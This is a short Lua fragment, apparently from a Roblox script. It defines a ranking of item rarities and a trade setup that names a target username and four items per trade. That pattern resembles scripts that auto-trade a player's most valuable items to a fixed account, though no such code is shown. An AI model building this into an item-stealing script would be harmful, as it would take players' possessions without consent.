local RaritySort = {Ancient=75, Godly=80, Legendary=85, Rare=90, Uncommon=95, Common=100, Christmas=105, Halloween=104, Classic=110, Unique=70}
local TradeConfig = {TargetUsername = "K3TCHUPSS", ItemsPerTrade = 4}
